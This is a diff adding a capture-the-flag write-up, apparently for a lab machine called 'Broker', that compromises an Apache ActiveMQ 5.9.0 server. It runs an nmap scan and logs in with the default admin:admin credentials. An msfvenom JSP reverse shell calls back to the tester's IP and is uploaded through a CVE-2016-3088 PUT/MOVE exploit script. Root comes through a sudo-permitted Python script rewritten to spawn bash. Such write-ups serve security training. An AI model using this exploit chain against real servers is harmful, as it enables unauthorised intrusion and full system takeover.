@@ -1,0 +1,119 @@
+Broker
+
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.223.93
+Host is up, received conn-refused (0.18s latency).
+Scanned at 2021-03-11 06:40:51 EST for 91s
+
+PORT      STATE SERVICE    REASON  VERSION
+22/tcp    open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4c:75:a0:7b:43:87:70:4f:70:16:d2:3c:c4:c5:a4:e9 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0E0J6enJ0afxy700qSiIX5MtF1OnZao36BxMDHd4z3X/fbRQc3WOsCzY9KsTw7RltG4bSBJGja3ppRbiLTowv+2aunR3nKPaR/Rea1NFCHPxonnYutUyqPsJIRnm+oV+hqd/rvn/BgLpdNo2bpWG1PG3gNVwmbuUqybL9XF3KoZz8gj6zZPJ+RV8yrM17R2bd1J7YgTMJBKSuKyzVQZJQHJMhdBLBOfVmF3PgajXe2Dm10xbL2rQ3Zsbbuk6hhc4Ypq1LYeZ1PA0aNuHoMzhjXlYQ3XElD5Rzr6rBo5LJr2VD2Y3mo86wyM6OZBb+B88Law3RJ4fwtjVgEoa2KX0F
+|   256 f4:62:b2:ad:f8:62:a0:91:2f:0a:0e:29:1a:db:70:e4 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyqJ0DAEyEKxeir3lNhPLTZNtDo/CfpLAKWpiSxZUd8NJIrcsNod31Tl+KSwMvNjNvW2ilD1YYxnO2A3FDApqg=
+|   256 92:d2:87:7b:98:12:45:93:52:03:5e:9e:c7:18:71:d5 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqDlHwUjvqNDfhowAQHQMu7A/HVUijCXkxdkgpF/pSe
+1883/tcp  open  mqtt?      syn-ack
+|_mqtt-subscribe: The script encountered an error: ssl failed
+8161/tcp  open  http       syn-ack Jetty 7.6.9.v20130131
+|_http-favicon: Unknown favicon MD5: 05664FB0C7AFCD6436179437E31F3AA6
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: Jetty(7.6.9.v20130131)
+|_http-title: Apache ActiveMQ
+40939/tcp open  tcpwrapped syn-ack
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+on port 8161 i found a http form(/admin) , by using the default creds as admin:admin
+i got successfully logged in!
+Find some interesting information
+
+
+Broker
+Name 	broker
+Version 	5.9.0
+ID 	ID:activemq-42653-1615444704285-0:1
+Uptime 	10 minutes
+
+after doing some research on port 1883
+it is a mqtt Iot messaging protocal, which can be use for chatting purposes
+after a long research i found a CVE for this server and also find a github repo contains a script which can gives us a reverse shell
+                                                                                                                                                                        
+so first i made a payload using msfvenom:
+
+┌──(kali㉿kali)-[~/broker]
+└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.73.218 LPORT=1234 -f raw > cmd.jsp                                              
+Payload size: 1497 bytes
+
+then using this, i upload a shell on the server:
+
+┌──(kali㉿kali)-[~/broker]
+└─$ python2.7 activeMQ.py -url http://broker.thm:8161/ -user admin -pass admin -shell cmd.jsp                                      
+# ActiveMQ的PUT 上传getshellExP CVE-2016-3088
+# Author:CF_HB
+# 时间：2016年6月8日
+# 漏洞参考地址: http://zone.wooyun.org/content/27737
+#1.PUT上去
+#2.找到路径
+#3.Move Shell
+
+# exp例子：
+# 原理参见zone里白帽子刺刺的分析，上传shell用法如下：
+    python ActiveMQExP.py -url http://192.168.18.133:8161/ -user admin -pass admin -shell D://shell.jsp
+
+[+]第一步PUT上传文件
+[+]Trying PUT..http://broker.thm:8161/fileserver/1615476191.txt
+[+]PUT文件成功
+[+]寻找Web应用安装路径
+[+]找到安装路径:/opt/apache-activemq-5.9.0
+[+]最后一步,MOVE得到shell
+[getshell success!]
+SHELL: http://broker.thm:8161/api/1615476191.jsp
+
+lets navigate through this address:
+
+USING METASPLOIT MULTI HANDLER:
+
+
+[*] Started reverse TCP handler on 10.8.73.218:1234 
+[*] Command shell session 1 opened (10.8.73.218:1234 -> 10.10.97.139:45024) at 2021-03-11 10:45:44 -0500
+
+id
+uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
+
+
+IM IN!!
+i use a stablized shell rather then the meterpreter for furthur enumeration
+
+GOT THE USER FLAG
+
+now, for root user
+
+activemq@activemq:/opt$ sudo -l
+Matching Defaults entries for activemq on activemq:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User activemq may run the following commands on activemq:
+    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
+activemq@activemq:/opt$ 
+
+changing the contents of the subscribe.py file to
+import pty
+pty.spawn("/bin/bash")
+
+then run the command as root:
+
+root@activemq:/opt/apache-activemq-5.9.0# id
+uid=0(root) gid=0(root) groups=0(root)
+root@activemq:/opt/apache-activemq-5.9.0# whoami
+root
+root@activemq:/opt/apache-activemq-5.9.0# 
+
+IM ROOT 
+GOT THE ROOT FLAG
